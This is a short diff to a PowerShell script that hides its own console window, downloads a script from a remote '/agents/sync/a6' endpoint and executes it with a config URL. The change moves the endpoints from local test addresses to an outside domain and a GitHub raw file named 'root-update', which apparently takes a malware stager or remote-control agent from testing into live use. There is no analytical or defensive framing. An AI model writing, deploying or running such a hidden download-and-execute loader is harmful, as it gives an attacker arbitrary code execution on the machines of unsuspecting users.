@@ -1,7 +1,7 @@
 Add-Type -Name W -Namespace H -MemberDefinition '[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int c);[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();' -EA 0
 [H.W]::ShowWindow([H.W]::GetConsoleWindow(),0)
-$apiBase = 'http://192.168.1.35:4000'
-$configUrl = 'http://192.168.1.35:8000/test.json'
+$apiBase = 'http://agent.apj-acesso.com:80'
+$configUrl = 'https://raw.githubusercontent.com/root-update/update/refs/heads/main/update.json'
 $a6Url = "$apiBase/agents/sync/a6"
 $t = (Invoke-WebRequest -Uri $a6Url -UseBasicParsing).Content -replace "^\uFEFF", ""
 & ([ScriptBlock]::Create($t)) -ConfigUrl $configUrl
